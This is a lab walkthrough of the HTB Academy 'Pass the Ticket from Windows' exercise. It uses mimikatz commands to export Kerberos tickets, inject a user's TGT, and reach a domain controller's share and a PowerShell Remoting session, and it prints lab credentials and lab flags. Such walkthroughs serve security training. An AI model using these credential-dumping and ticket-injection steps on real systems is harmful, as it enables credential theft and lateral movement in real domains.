### CPTS / HTB Penetration Tester Path <br>
### Password Attacks: Pass The Ticket (PtT) from Windows <br>
<mark>hook it up with a follow if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

IP: 10.129.126.191

RDP to 10.129.126.191 (ACADEMY-PWATTACKS-LM-MS01) with user "Administrator" and password `'AnotherC0mpl3xP4$$'`

---

### Question 1:
Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?

RDP into the winbox as the admin. Then lets give ole' mimikatz a whirl:
```diff
+ c:\tools>mimikatz.exe
```
```diff
+ mimikatz # privilege::debug
```

	Privilege '20' OK
```diff
+ mimikatz # sekurlsa::tickets /export
```

This will output a ton, but if you look in the Tools directory in explorer you will see a bunch of dumped tickets. Upon further inspection we can see that only three of them have user's names.

🚩 found **3**.

---

### Question 2:
Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder `\\DC01.inlanefreight.htb\john`

Use john's saved TGT to PtT:
```diff
+ mimikatz # kerberos::ptt "C:\tools\[0;46a9b]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
```

Then use this to open a new term window:
```diff
+ mimikatz # misc::cmd
```

In this new window we can map the network share to an open drive letter (TEMPORARILY) with pushd:
```diff
+ c:\Users\john>pushd \\DC01.inlanefreight.htb\john
```

Now we're pushed into Z: which is a temp map of the network share:
```diff
+ Z:\>dir
```

	 Volume in drive Z has no label.
	 Volume Serial Number is B8B3-0D72
	
	 Directory of Z:\
	
	07/14/2022  07:25 AM    <DIR>          .
	07/14/2022  07:25 AM    <DIR>          ..
	07/14/2022  03:54 PM                30 john.txt
	               1 File(s)             30 bytes
	               2 Dir(s)  18,265,579,520 bytes free
```diff
+ Z:\>type john.txt
```

	Learn1ng_M0r3_Tr1cks_with_J0hn

And you can use popd to unmap:
```diff
+ Z:\>popd
```

	c:\Users\john>

🚩 found **Learn1ng_M0r3_Tr1c--edit--ks_with_J0hn**.

---

### Question 3:
Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt

Lets head back to tools and run a freshie mimikatz:
```diff
+ c:\tools>mimikatz.exe
```
```diff
+ mimikatz # privilege::debug
```

	Privilege '20' OK

Now do the dang ptt with john's previously saved ticket:
```diff
+ mimikatz # kerberos::ptt "[0;46a9b]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
```

	* File: '[0;46a9b]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK

Cool now we can exit mimikatz, make sure you say bye! back.
```diff
+ mimikatz # exit
```

	Bye!

Now open a PS and use the Enter-PSSession cmdlet to pop a shell to the domain controller:
```diff
+ c:\tools>powershell
```
```diff
+ PS C:\tools> Enter-PSSession -ComputerName DC01
```
```diff
+ [DC01]: PS C:\Users\john\Documents> type C:\john\john.txt
```

	P4$$_th3_Tick3T_PSR

🚩 found **P4$$_th3_Tic--edit--k3T_PSR**.
